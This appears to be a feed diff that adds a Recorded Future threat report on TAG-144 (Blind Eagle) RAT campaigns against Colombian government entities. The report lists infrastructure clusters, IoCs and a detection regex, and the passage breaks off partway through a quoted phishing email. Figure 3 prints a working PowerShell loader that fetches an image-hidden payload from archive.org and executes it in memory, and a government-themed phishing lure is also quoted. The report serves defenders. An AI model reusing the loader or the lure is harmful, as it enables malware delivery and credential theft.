@@ -4,12 +4,322 @@
         <title>Recorded Future</title>
         <link>https://www.recordedfuture.com</link>
         <description>Strengthen Your Defenses with Threat Intelligence</description>
-        <lastBuildDate>Mon, 25 Aug 2025 09:02:48 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 26 Aug 2025 14:01:24 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Recorded Future, Inc.</generator>
         <language>en</language>
         <copyright>Copyright © 2025 Recorded Future, Inc.</copyright>
         <atom:link href="https://www.recordedfuture.com/feed" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[TAG-144’s Persistent Grip on South American Organizations]]></title>
+            <link>https://www.recordedfuture.com/research/tag-144s-persistent-grip-on-south-american-organizations</link>
+            <guid isPermaLink="false">https://www.recordedfuture.com/research/tag-144s-persistent-grip-on-south-american-organizations</guid>
+            <pubDate>Wed, 21 Jan 1970 07:49:26 GMT</pubDate>
+            <description><![CDATA[Persistent cyber operations by TAG-144 (Blind Eagle) continue to target South American, primarily Colombian, government entities through advanced spearphishing and RAT-based malware campaigns. Explore the latest threat clusters, TTPs, and mitigation strategies.]]></description>
+            <content:encoded><![CDATA[
+        <p><em>Note: The analysis cut-off date for this report was July 21, 2025.</em></p>
+        <h2>Executive Summary</h2>
+        <p>Insikt Group has identified five distinct activity clusters linked to TAG-144 (also known as Blind Eagle). These clusters have operated at various times throughout 2024 and 2025, targeting a significant number of victims, primarily within the Colombian government across local, municipal, and federal levels. Although the clusters share similar tactics, techniques, and procedures (TTPs) such as leveraging open-source and cracked remote access trojans (RATs), dynamic domain providers, and legitimate internet services (LIS) for staging, they differ significantly in infrastructure, malware deployment, and other operational methods. Insikt Group also found further evidence linking TAG-144 to Red Akodon and identified various compromised Colombian government email accounts likely used in spearphishing campaigns.</p>
+        <p>To protect against TAG-144, security defenders should block IP addresses and domains tied to associated RATs, flag and potentially block connections to unusual LIS, and deploy updated detection rules (YARA, Sigma, Snort) for current and historic infections. Other controls include implementing email filtering and data exfiltration monitoring. See the <strong>Mitigations</strong> section for implementation guidance and <strong>Appendix B</strong> for a complete list of IoCs. In the long term, analysts should continuously monitor the cybercriminal ecosystem for emerging threats and adapt controls accordingly.</p>
+        <h2>Key Findings</h2>
+        <ul>
+          <li>Insikt Group has tracked five distinct activity clusters associated with TAG-144 (Blind Eagle), each displaying overlapping yet varied TTPs and collectively targeting numerous victims, primarily within the Colombian government, throughout 2024 and 2025.</li>
+          <li>TAG-144 appears to maintain an extensive operational infrastructure, comprising virtual private servers (VPS), IP addresses within Colombian ISP ranges, and servers that appear to function as VPN servers. These typically host domains registered through various dynamic DNS services such as <em>duckdns[.]org</em>, <em>noip[.]com</em>, and <em>con-ip[.]com</em>, among others.</li>
+          <li>TAG-144 has employed a wide array of open-source and cracked RATs, including AsyncRAT, DcRAT, REMCOS RAT, XWorm, and LimeRAT, among others. These payloads are typically deployed through a multi-stage infection chain that leverages an expanding set of LIS and uses steganography to obscure malicious content and evade detection.</li>
+        </ul>
+        <h2>Background</h2>
+        <p>TAG-144, also known as Blind Eagle, AguilaCiega, APT-C-36, and APT-Q-98, is a threat group that has been <a href="https://cyberpress.org/new-apt-group-blindeagle-strikes-organizations/">active</a> since at least 2018, primarily targeting South America, especially Colombia. While the threat group’s overall motivation <a href="https://securelist.com/blindeagle-apt/113414/">remains</a> ambiguous, its activity reflects both cyber-espionage and financially driven motivations. TAG-144’s primary focus appears to be on credential theft, evidenced by banking-related keylogging and browser monitoring, alongside indications of espionage, such as persistently targeting government entities and using modified RATs with surveillance functions (<a href="https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html">1</a>, <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">2</a>).</p>
+        <p>The group’s primary targets include government institutions, especially judiciary and tax authorities, alongside financial entities, petroleum and energy companies, and organizations within the education, healthcare, manufacturing, and professional services sectors (<a href="https://hivepro.com/wp-content/uploads/2024/09/TA2024345.pdf">1</a>, <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">2</a>). Operations are mainly focused on Colombia, with additional activity in <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">Ecuador</a>, <a href="https://securelist.com/blindeagle-apt/113414/">Chile</a>, and <a href="https://securelist.com/blindeagle-apt/113414/">Panama</a>, and occasional campaigns in North America <a href="https://www.esentire.com/blog/blind-eagles-north-american-journey">targeting</a> Spanish-speaking users.</p>
+        <p>Initial access typically <a href="https://lab52.io/blog/apt-c-36-recent-activity-analysis/">occurs</a> through spearphishing campaigns impersonating local government agencies, most notably Colombian authorities. These campaigns leverage themes such as debt collection and judicial notifications to lure victims into opening malicious documents (<a href="https://blog.scilabs.mx/malware-campaign-attributed-to-apt-c-36-context-and-iocs-update-june-2022/">1</a>, <a href="https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/">2</a>). They have often <a href="https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html">used</a> URL shorteners like <em>cort[.]as</em>, <em>acortaurl[.]com</em>, and <em>gtly[.]to</em> to conceal malicious links and target users geographically. TAG-144 employs geo-fencing and other detection evasion measures that <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">block</a> access from outside Colombia or Ecuador, <a href="https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html">redirecting</a> outsiders to official government websites. TAG-144 has consistently leveraged compromised email accounts in its spearphishing campaigns, including those associated with government entities and private individuals.</p>
+        <p>TAG-144 leverages a range of commodity remote access trojans (RATs), including AsyncRAT, REMCOS RAT, DcRAT, njRAT, LimeRAT, QuasarRAT, BitRAT, and a Quasar variant <a href="https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-insurance-sector-blotchyquasar">known</a> as BlotchyQuasar. Its tooling also <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">involves</a> crypters such as HeartCrypt, PureCrypter, and those developed by threat actors like “Roda” and “pjoao1578”, with indicators pointing to the use of crypter-as-a-service offerings such as CryptersAndTools, which originates from Brazil. Additionally, it <a href="https://securelist.com/blindeagle-apt/113414/">employs</a> steganography techniques, embedding malicious payloads within image files to evade detection.</p>
+        <p>TAG-144’s command-and-control (C2) infrastructure often <a href="https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/">incorporates</a> IP addresses from Colombian ISPs alongside virtual private servers (VPS) such as Proton666 and VPN services like Powerhouse Management, FrootVPN, and TorGuard (<a href="https://lab52.io/blog/apt-c-36-recent-activity-analysis/">1</a>, <a href="https://censys.com/blog/unmasking-the-infrastructure-of-a-spearphishing-campaign">2</a>). This setup is further <a href="https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia">enhanced</a> by the use of dynamic DNS services, including <em>duckdns[.]org</em>, <em>ip-ddns[.]com</em>, and <em>noip[.]com</em>. The threat group is suspected, though not definitively confirmed, to use compromised routers, which are then repurposed as reverse proxies to obscure the true locations of their C2 servers and complicate attribution.</p>
+        <p>The threat group has consistently leveraged LIS, particularly during the payload staging phase. These services include widely used platforms like Bitbucket, Discord, Dropbox, GitHub, Google Drive, Paste.ee, and lesser-known platforms such as undisclosed Brazilian image-hosting websites. Additionally, the group has been observed using compromised accounts to host malicious content, including a Google Drive folder <a href="https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-insurance-sector-blotchyquasar">tied</a> to a compromised account associated with a regional Colombian government organization.</p>
+        <p>The threat group's origin remains uncertain, though multiple studies suggest it operates within the UTC-5 or UTC-4 time zones (<a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">1</a>, <a href="https://web.archive.org/web/20190625182633/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/">2</a>), consistent with countries like Colombia and Ecuador, with some research specifically pointing to Colombia as its base. Notably, technical artifacts have <a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">contained</a> both Spanish- and Portuguese-language comments. The Spanish <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">observed</a> in the comments closely resembles the regional dialects commonly spoken in the targeted countries. Additionally, the threat group has been observed using tools and services tied to the Brazilian cybercriminal underground, <a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">indicating</a> a possible connection with Brazilian threat actors.</p>
+        <p>Three key factors set TAG-144 apart within the cybercriminal ecosystem. First, while globalization, cybercriminal collaboration, and hardware/software standardization have lowered barriers for threat actors to operate globally, threat actors, including TAG-144, often remain regionally focused due to cultural nuances, tacit knowledge, and persistence. Second, despite some tooling improvements, TAG-144 has largely relied on consistent techniques since its emergence. Their continued success, reflected in a high number of victims, underscores how well-established methods remain effective over time. Lastly, TAG-144 exemplifies the increasingly blurred lines between cybercrime and espionage, a trend that has become more prominent in the coming year. In this context, a comprehensive approach to tackling cyber threats becomes even more crucial, requiring improved defenses, deeper regional knowledge, and enhanced coordination.</p>
+        <h2>Threat Analysis</h2>
+        <p>Insikt Group identified five activity clusters associated with TAG-144 that were active between May 2024 and July 2025 (see <strong>Figure 1</strong>). Activity periods were determined based on domain resolutions, sample submissions, and victim traffic, as observed through <a href="https://assets.recordedfuture.com/Datasheets/Datasheet-Network-Intelligence.pdf">Recorded Future® Network Intelligence</a>.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1148c7478f3b920c4dbb246717cc8df1da52bb414.png?width=750&amp;format=png&amp;optimize=medium" width="1384" height="658" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 1:</strong> Cluster activity timelines (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <p>The following clusters have been observed:</p>
+        <ul>
+          <li><strong>Cluster 1</strong>, active from February through July 2025, comprises C2 IPs primarily associated with TorGuard VPN and one Colombian ISP hosting <em>duckdns[.]org</em> and, starting in July 2025, <em>noip[.]com</em> domains with static resolution and minimal rotation. Cluster 1 is linked to DcRAT, AsyncRAT, and REMCOS RAT infections targeting Colombian government entities exclusively.</li>
+          <li><strong>Cluster 2</strong>, active between September and December 2024, included C2 IPs tied to AS-COLOCROSSING, Colombian ISPs, and VULTR hosting <em>duckdns[.]org</em>, <em>con-ip[.]com</em>, and <em>kozow[.]com</em> domains. Cluster 2 is associated with AsyncRAT activity targeting the Colombian government and entities in the education, defense, and retail sectors.</li>
+          <li><strong>Cluster 3</strong>, active from September 2024 to July 2025, consists of C2 IPs linked to Colombian ISP UNE EPM hosting <em>duckdns[.]org</em> and, occasionally, <em>con-ip[.]com</em> domains. Cluster 3 is associated with both AsyncRAT and REMCOS RAT deployments.</li>
+          <li><strong>Cluster 4</strong>, active from May 2024 to February 2025, is notable for combining malware and phishing infrastructure attributed to TAG-144.</li>
+          <li><strong>Cluster 5</strong>, active from March to July 2025, consists of C2 IPs linked to GLESYS (AS42708) hosting dynamically resolving <em>duckdns[.]org</em> domains. Cluster 5 is associated with LimeRAT and a cracked AsyncRAT variant seen in Clusters 1 and 2.</li>
+        </ul>
+        <p>Insikt Group identified infrastructure overlaps between the clusters, establishing a connection among them. Additionally, the clusters share notable similarities in TTPs, including infrastructure choices, domain naming patterns, malware deployment, and the abuse of LIS. However, each cluster also exhibits distinct differences, which are explored in detail in the following sections of this report.</p>
+        <h3>Cluster 1</h3>
+        <p><strong><em>Infrastructure Analysis</em></strong></p>
+        <p>Cluster 1, active from at least February through July 2025, comprises C2 IP addresses primarily linked to TorGuard VPN servers and, in one case, a Colombian ISP. This cluster typically hosts <em>duckdns[.]org</em> and, more recently, <em>noip[.]com</em> domains with specific naming patterns; it has also been observed deploying DcRAT, AsyncRAT, and REMCOS RAT. The IP addresses linked to Cluster 1 are listed in <strong>Appendix A</strong>. The domains consistently resolve to the same static IP addresses over time, with minimal rotation observed within Cluster 1.</p>
+        <p>The subdomain names, likely generated by a domain generation algorithm (DGA), commonly include the word “envio” followed by a numeric part, as in, for example, <em>envio16-05[.]duckdns[.]org</em>. The names are detectable via the regex in <strong>Figure 2</strong> and are detailed in <strong>Appendix B</strong>.</p>
+        <div>
+          <div>
+            <div><code>envio[0-9\-]{2,5}\.duckdns\.org</code></div>
+          </div>
+        </div>
+        <p><strong>Figure 2:</strong> Regex for suspected DGA linked to Cluster 1 (Source: Recorded Future)</p>
+        <p>While prior research has <a href="https://censys.com/blog/unmasking-the-infrastructure-of-a-spearphishing-campaign">suggested</a> that the TorGuard VPN servers associated with Cluster 1 are used for port forwarding, the exposure of C2 components, such as default transport layer security (TLS) certificates tied to deployed malware families, indicates these IP addresses are likely dedicated VPN instances directly controlled by TAG-144.</p>
+        <p>In addition to the TorGuard VPN servers, Cluster 1 includes IP addresses associated with Colombian ISPs, such as Colombia’s primary provider, COLOMBIA TELECOMUNICACIONES S.A. E.S.P. While earlier reporting on Blind Eagle in 2020 <a href="https://lab52.io/blog/apt-c-36-recent-activity-analysis/">suggested</a> the possible use of compromised routers for C2 infrastructure, Insikt Group has not confirmed such activity for the observed IP addresses.</p>
+        <p>Notably, several domains hosted on TorGuard VPN servers listed in <strong>Appendix A</strong> were previously resolved to IP addresses belonging to Colombian ISPs, such as <em>trabajonuevos[.]duckdns[.]org</em>. These IP addresses and their associated domains are detailed in <strong>Appendix A</strong>. Similarly, certain domains, such as <em>diazpool14[.]duckdns[.]org</em>, were previously hosted on IP addresses linked to GLESYS (AS42708), an ASN identified in association with Cluster 5.</p>
+        <p><strong><em>Abuse of Legitimate Internet Services, Including lovestoblog[.]com</em></strong></p>
+        <p>As is typical for TAG-144, Cluster 1 has leveraged various LIS during staging, such as Tagbox, Archive, Paste.ee, Discord, and BitBucket, and for the first time in TAG-144 activity, the free hosting platform <em>lovestoblog[.]com</em> by InfinityFree. More specifically, the subdomain <em>sudo102[.]lovestoblog[.]com</em> <a href="https://pro.urlscan.io/result/019782e0-8da0-716a-a141-09affb6c9f1a">hosted</a> several text files that loaded an encoded PowerShell script, which retrieved the next stage of the infection chain from a JPG image hosted on <em>archive[.]org</em>. (See <strong>Figure 3</strong> for the infection chain; line breaks were added for readability.)</p>
+        <div>
+          <div>
+            <div>
+              <pre><code>$craploads = 'SilentlyContinue'
+$islamist = 'https://archive[.]org/download/new_image_20250531_1942/new_image.jpg'
+$seiche = New-Object System.Net.WebClient
+$seiche.Headers.Add('User-Agent', 'Mozilla/5.0')
+[byte[]]$homophobes = $seiche.DownloadData($islamist)
+$rythmic = [System.Text.Encoding]::UTF8.GetString($homophobes)
+
+$protamphirhine = 'INICIO&gt;&gt;'
+$unrubberized = '&lt;&lt;FIM&gt;&gt;'
+$petrograph = $ither
+
+$formylation = $rythmic.IndexOf($protamphirhine)
+$inconveniency = $rythmic.IndexOf($unrubberized)
+
+if ($formylation -ne -1 -and $inconveniency -ne -1 -and $inconveniency -gt $formylation) {
+    $formylation += $protamphirhine.Length
+    $petrograph = $rythmic.Substring($formylation, $inconveniency - $formylation)
+}
+
+$higgsinos = '#x#.e13ba2379fd20168b9c460418b963234_oviuqra/moc.golbo#sevol.201odus//:p##h'
+$higgsinos = $higgsinos.Replace('#', 't')
+$petrograph = $petrograph.Replace('@', 'A')
+
+$MacArthur = [System.Convert]::FromBase64String($petrograph)
+$aginator = [Reflection.Assembly]::Load($MacArthur)
+
+$towelette = [dnlib.IO.Home].GetMethod('VAI').Invoke(
+    $ither,
+    [object[]]@(
+        $higgsinos,
+        '', '', '',
+        'MSBuild', '', '', '', '',
+        'C:\Users\Public\Downloads',
+        'Mattagami',
+        'js', '', '',
+        'duparted',
+        '2', ''
+    )
+)
+</code></pre>
+            </div>
+          </div>
+        </div>
+        <p><strong>Figure 3:</strong> Payload hosted on archive[.]org URL (Source: Recorded Future)</p>
+        <p>At least one text file hosted on <em>sudo102[.]lovestoblog[.]com</em> <a href="https://pro.urlscan.io/result/019782e0-99ce-730c-8ae0-87695a1e22c3/dom">included</a> comments in Portuguese (for example, “Junta os comandos,” which translates to “Add the commands”), a characteristic previously observed in connection with Blind Eagle (<a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">1</a>, <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tracing-blind-eagle-to-proton66/">2</a>). This was suspected to <a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">indicate</a> possible collaboration between the threat actor and external threat groups; however, it could also be explained by the presence of Portuguese-speaking members, code reuse, or intentional false flag operations.</p>
+        <p><strong><em>Malware</em></strong></p>
+        <p>Insikt Group observed Cluster 1 using both the “1.0.7” version of AsyncRAT and a variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2”, which has the mutex <code>AsyncMutex_6SI8OkPnk</code>. xworm_v2 is an active Telegram channel with over 300 members, known for sharing and distributing cracked versions of paid software.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1fa06eb0e1a6c6074784c89eab438c353e2358092.png?width=750&amp;format=png&amp;optimize=medium" width="296" height="640" />
+            </div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1a75692323990a876e396cc4c8a4a55c451cde166.png?width=750&amp;format=png&amp;optimize=medium" width="296" height="640" />
+            </div>
+          </div>
+        </div>
+        <p><strong>Figure 4:</strong> Telegram channel hxxps://t[.]me/xworm_v2 (Source: Recorded Future)</p>
+        <p>The cracked version observed in connection with TAG-144 was <a href="https://blog.scilabs.mx/en/2024/05/27/red-akodon-a-new-threat-actor-distributing-rat-to-colombia/">linked</a> to a threat actor tracked as Red Akodon in May 2024; it appeared again in June 2025 in a <a href="https://www.acronis.com/en-sg/tru/posts/shadow-vector-targets-colombian-users-via-privilege-escalation-and-court-themed-svg-decoys/">report</a> potentially referencing the same threat actor based on observed TTPs, though without formal attribution.</p>
+        <p><strong><em>Victimology</em></strong></p>
+        <p>Using Recorded Future Network Intelligence, Insikt Group identified a significant number of victims exclusively linked to the Colombian government associated with Cluster 1 (see <strong>Appendix C</strong>). Network communications, as observed by Recorded Future Network Intelligence, began in March 2025 and ended in June 2025. Notably, the cessation of activity may indicate that the threat actors were either evicted, completed their objectives and withdrew voluntarily, or transitioned to other tooling and egress points.</p>
+        <p>As shown in <strong>Appendix C</strong>, multiple victims were observed communicating with several C2 servers associated with Cluster 1. This activity likely resulted from changes in DNS resolution for the C2 domains over time. In some instances, Insikt Group assesses that multiple infections occurred within the same victim network, with all compromised systems communicating with the C2 infrastructure through a shared egress point. In some cases, Insikt Group was unable to conclusively identify the exact victim due to multiple entities sharing the same name.</p>
+        <p><strong><em>Infrastructure Management</em></strong></p>
+        <p>Although the exact infrastructure management methods used by TAG-144 for Cluster 1 remain unclear at this time, Insikt Group identified indications that the threat group may have leveraged a compromised Mikrotik router as a proxy to communicate with the C2 servers over a port.</p>
+        <h3>Cluster 2</h3>
+        <p><strong><em>Infrastructure Analysis</em></strong></p>
+        <p>Cluster 2, active from at least September to December 2024, comprises C2 IP addresses primarily linked to AS-COLOCROSSING, Colombian ISP IP addresses, and, in at least one case, VULTR. It typically hosts <em>duckdns[.]org</em> or <em>con-ip[.]com</em> domains with specific naming patterns and has been observed deploying AsyncRAT. In a few cases, Insikt Group also observed domains linked to the free dynamic DNS provider <em>kozow[.]com</em>. The IP addresses linked to Cluster 2 are listed in <strong>Appendix D</strong>.</p>
+        <p>The subdomain names, likely generated by a DGA algorithm, often consist of Spanish words, as in <em>pesosdepesoslibras[.]duckdns[.]org</em>. Sometimes, they are followed by numbers, as in <em>paseoencarro2024[.]con-ip[.]com</em>. (For a detailed list of these subdomain names, see <strong>Appendix A</strong>.) Notably, many of the domains currently hosted on AS-COLOCROSSING IP addresses (see <strong>Appendix D</strong>) were previously associated with IPs from Colombian ISPs, such as <em>179[.]14[.]8[.]26</em>, <em>181[.]131[.]217[.]255</em>, <em>177[.]255[.]84[.]82</em>, and <em>191[.]88[.]248[.]162</em>, indicating they may have been reused across different hosting infrastructures.</p>
+        <p>In addition to the Spanish-themed domains, Insikt Group identified a large set of DuckDNS and CON-IP domains, likely generated by another DGA algorithm and all starting with the keyword “deadpoolstart,” followed by a four-digit number (see <strong>Appendix E</strong>). Notably, the <em>con-ip[.]com</em> domains resolve to the AS-COLOCROSSING IP address <em>64[.]188[.]9[.]172</em>, while the <em>duckdns[.]org</em> domains all resolve to IP addresses belonging to Colombian ISPs.</p>
+        <p><strong><em>Abuse of Legitimate Internet Services</em></strong></p>
+        <p>Similar to Cluster 1, Cluster 2 has also been observed leveraging various LIS during staging, including GitHub, Archive, Paste.ee, and more recently, the free hosting platform <em>lovestoblog[.]com</em> by InfinityFree, which ultimately <a href="https://tria.ge/250702-vahxmsyxav/behavioral3">led</a> to an XWorm infection using the C2 domain <em>deadpoolstart2064[.]duckdns[.]org</em>.</p>
+        <p>Insikt Group also <a href="https://tria.ge/s?q=eeb8b79e875f78820e41f2d5f06fddd2338962e4e8ea046b974ab9f04e963d54">identified</a> a payload named <code>RELACIÓN DE SALDOS - CUENTA DE COBRO.pdf.exe</code> associated with Cluster 2, which staged its content via two GitHub Gist URLs linked to the account SmikeY666:</p>
+        <ul>
+          <li><em>hxxps://gist[.]githubusercontent[.]com/SmikeY666/50447c53097f8884ffc754a8779fa2a3/raw</em></li>
+          <li><em>hxxps://gist[.]githubusercontent[.]com/SmikeY666/8504274482e8e688d9489b302bfbc45e/raw</em></li>
+        </ul>
+        <p>The payload <a href="https://tria.ge/s?q=eeb8b79e875f78820e41f2d5f06fddd2338962e4e8ea046b974ab9f04e963d54">results</a> in an AsyncRAT infection, with the malware reaching out to its C2 server, <em>cococovid202420242024[.]duckdns[.]org</em>, which resolved to IP address <em>64[.]188[.]9[.]175</em> as of December 26, 2024.</p>
+        <p>Notably, the GitHub account “SmikeY666” included a link to a 2024 Vimeo video demonstrating an allegedly cracked version of SilverRAT, a Windows-based RAT that first <a href="https://www.cyfirma.com/research/a-gamer-turned-malware-developer-diving-into-silverrat-and-its-syrian-roots/">appeared</a> in 2023. It has been distributed across various forums and appears to be developed by an individual or group using the alias Anonymous Arabic.</p>
+        <p><strong><em>Malware</em></strong></p>
+        <p>Insikt Group observed Cluster 2 using the AsyncRAT variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2” with the mutex <code>AsyncMutex_6SI8OkPnk</code>. Additionally, the cluster deployed AsyncRAT samples featuring custom mutexes such as <code>tempcookieess</code>, <code>tempcokies</code>, <code>tempcookiee</code>, <code>WinCookies</code>, <code>Cookies</code>, and <code>CookiesGoogleChrome</code>, among others. These samples can be tracked via Recorded Future Malware Intelligence. At least some of the samples <a href="https://tria.ge/241001-xkwycsvglk">are</a> encrypted using a crypter attributed to Roda, a tool <a href="https://www.esentire.com/blog/blind-eagles-north-american-journey">associated</a> with Blind Eagle activity.</p>
+        <p><strong><em>Victimology</em></strong></p>
+        <p>Using Recorded Future Network Intelligence, Insikt Group identified nine victims associated with Cluster 2, primarily linked to Colombian government entities, along with victims from the education, defense, and retail sectors, among others (see <strong>Appendix F</strong>). Network communications observed by Recorded Future began in early October 2024 and ended in December 2024.</p>
+        <p>As with Cluster 1, multiple infections were observed within some of the victim organizations linked to Cluster 2, suggesting broader targeting or possible lateral movement. There is also evidence of victim overlap between Clusters 1 and 2. Furthermore, based on high volumes of network traffic from Colombian ISP IP addresses to C2 ports during the relevant timeframes, the actual number of victims is likely higher than what has been confirmed.</p>
+        <h3>Cluster 3</h3>
+        <p>Cluster 3, active from at least September 2024 to July 2025, comprises C2 IP addresses primarily linked to the Colombian ISP UNE EPM, typically hosting DuckDNS or, in rare cases, <em>con-ip[.]com</em>, domains. Insikt Group has observed AsyncRAT as well as REMCOS RAT infections linked to Cluster 3. The IP addresses linked to Cluster 3 are listed in <strong>Appendix G</strong>.</p>
+        <p>The subdomain names, likely generated using a domain DGA, often incorporate Spanish names, as in <em>sebastiancorrea905040[.]duckdns[.]org</em>, sometimes appended with numerical sequences. (For a detailed list of these subdomain names, see <strong>Appendix B</strong>.) Notably, one of the domains associated with Cluster 3, <em>sebastianguerrero5040[.]con-ip[.]com</em>, was observed resolving to the Cluster 2 IP address <em>64[.]188[.]9[.]177</em> between at least September 11 and November 11, 2024.</p>
+        <p>Similar to Clusters 1 and 2, Cluster 3 has also been observed abusing multiple LIS, including Tagbox, Archive, and Paste.ee, among others.</p>
+        <h3>Cluster 4</h3>
+        <p>Cluster 4, active from at least May 2024 to February 2025, differs from the others in that it is not only associated with malware infrastructure but also with phishing activity attributed to TAG-144. The IP addresses linked to Cluster 4 are listed in <strong>Appendix H</strong>. The full list of domains linked to the IP addresses in <strong>Appendix H</strong> is listed in <strong>Appendix A</strong>.</p>
+        <p>The phishing pages linked to Cluster 4 have been observed impersonating multiple banks, including Banco Davivienda, Bancolombia, and BBVA (see <strong>Figure 5</strong>). Notably, these lures differ from earlier ones attributed to TAG-144, which primarily impersonated government entities such as tax authorities or judicial bodies. Previous campaigns also appeared to target government-affiliated individuals or organizations, as evidenced by the victims associated with Clusters 1 and 2.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1340f098ea297aa5ad03c0694fac9811b58e6cf1e.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1200" />
+            </div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1f518fa040a8d017faf3f8a5f8deda6a43620d784.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1200" />
+            </div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_16bab54dc9f3bace27a6e7c7773ca3676f8219158.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1200" />
+            </div>
+          </div>
+        </div>
+        <p><strong>Figure 5:</strong> Phishing pages linked to Cluster 4 (Source: <a href="https://urlscan.io/result/984376cf-9e75-480d-9883-e6eaf41a8491">URLScan</a>, <a href="https://urlscan.io/result/4ebbe460-c1db-45b5-9af8-d612e39a9417">URLScan</a>, <a href="https://urlscan.io/result/645edc12-ed71-4290-9fa2-5fa6646028c9">URLScan</a>)</p>
+        <p>Notably, a phishing page impersonating BBVA and hosted on the domain <em>keepz[.]duckdns[.]org</em> contained the IP address <em>181[.]131[.]217[.]139</em> in its document object model (DOM), as seen in <strong>Figure 6</strong>. This IP was hosting the domains <em>env2023nue[.]duckdns[.]org</em> and <em>chichichi01[.]duckdns[.]org</em> in 2023. The domain <em>env2023nue[.]duckdns[.]org</em> was publicly <a href="https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/">linked</a> to APT-C-36 (Blind Eagle) and likely remained in use by the same threat actor, as it continued to host an open directory containing folders related to Banco Davivienda, Banco Colombia, Banco Caja Social, and others until at least March 14, 2024, while being hosted on IP address <em>179[.]14[.]9[.]152</em>. The domain <em>chichichi01[.]duckdns[.]org</em> <a href="https://raw.githubusercontent.com/stamparm/maltrail/master/trails/static/malware/asyncrat.txt">served</a> as a C2 domain for AsyncRAT based on public reporting and was also hosted on IP address <em>179[.]14[.]9[.]152</em> between March 22 and May 8, 2024.</p>
+        <div>
+          <div>
+            <div>
+              <pre><code>…
+    &lt;footer class="d-flex justify-content-center"&gt;
+        &lt;p&gt;
+            Dirección IP: 181[.]131[.]217[.]139
+        &lt;/p&gt;
+        &lt;p&gt;
+            Copyright©2023 Bancolombia S.A.
+        &lt;/p&gt;
+    &lt;/footer&gt;
+…
+</code></pre>
+            </div>
+          </div>
+        </div>
+        <p><strong>Figure 6:</strong> IP address left in the DOM of a phishing page (Source: <a href="https://urlscan.io/result/4ebbe460-c1db-45b5-9af8-d612e39a9417/dom">URLScan</a>)</p>
+        <h3>Cluster 5</h3>
+        <p>Cluster 5, which has been active since at least March to July 2025, comprises C2 IP addresses primarily linked to GLESYS (AS42708), typically hosting <em>duckdns[.]org</em> domains. The domains linked to Cluster 5 are listed in <strong>Appendix I</strong>. Cluster 5 is the only cluster associated with the deployment of LimeRAT, which in this case uses the mutex <code>1e97ead369</code>. The AsyncRAT variant linked to Cluster 5 is the same cracked version identified in Clusters 1 and 2. Of note, the domains frequently resolve to changing IP addresses, with those observed by Insikt Group detailed in <strong>Appendix B</strong>.</p>
+        <p>Similar to the other clusters, Cluster 5 has also been observed leveraging various LIS during staging, including Archive, Paste.ee, and Tagbox.</p>
+        <h2>Infection Chain</h2>
+        <h3>Phishing Email</h3>
+        <p>Insikt Group identified an email sent to undisclosed recipients from a likely compromised domain, <em>alcaldia[@]simacota-santander[.]gov[.]co</em>, associated with the Mayor’s Office of Simacota in the Santander department of Colombia. Infections stemming from this email have been confirmed to result in AsyncRAT deployment, communicating with the C2 domain <em>envio01[.]ddns[.]net</em>, a domain previously linked to Cluster 1.</p>
+        <div>
+          <div>
+            <div>
+              <pre><code>De: Alcaldía Simacota Santander &lt;REDACTED&gt;
+Enviado el: martes, 1 de julio de 2025 3:23 p. m.
+Para: undisclosed-recipients:
+Asunto: Cobro por intereses moratorios – Radicado 11001-28-05-03004
+
+¡Cuidado! este correo proviene de un usuario externo, no abras archivos adjuntos ni hagas clic en enlaces sin validar que el remitente y el contenido sean seguros. Nunca entregues tu usuario ni contraseñas a través de enlaces.
+
+Se inicia ejecución por intereses causados por pago extemporáneo.
+Consulte el archivo para liquidación detallada.
+</code></pre>
+              <p><code>Cordialmente,</code></p>
+            </div>
+            <div>
+              <pre><code>From: Simacota Santander Mayor's Office &lt;REDACTED&gt;
+Sent: Tuesday, July 1, 2025 3:23 p.m.
